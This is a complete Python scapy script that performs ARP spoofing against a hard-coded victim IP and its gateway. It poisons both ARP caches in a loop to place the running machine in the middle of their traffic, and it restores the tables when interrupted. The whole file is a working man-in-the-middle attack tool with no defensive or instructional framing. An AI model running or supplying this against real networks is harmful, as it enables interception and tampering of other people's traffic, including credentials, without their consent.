#!/usr/bin/env python

import time
import scapy.all as scapy
import sys


def get_mac_address(ip):
    req = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    req_broadcast = broadcast/req
    answered = scapy.srp(req_broadcast, verbose=False, timeout=1)[0]
    return answered[0][1].hwsrc


def arp_spoof(target_ip, spoof_id):
    target_mac = get_mac_address(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_id)
    scapy.send(packet, verbose=False)


def restore(dest_ip, src_ip):
    dst_mac = get_mac_address(dest_ip)
    src_mac = get_mac_address(src_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dst_mac,
                       psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, count=4, verbose=False)


target_ip = "192.168.1.101"
gateway_ip = "192.168.1.1"

count = 0
try:
    while True:
        arp_spoof(target_ip, gateway_ip)
        arp_spoof(gateway_ip, target_ip)
        count += 2
        print(f"\r Packets sent: {count}", end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\nReseting ARP tables...")
    restore(target_ip,  gateway_ip)
    restore(gateway_ip,  target_ip)
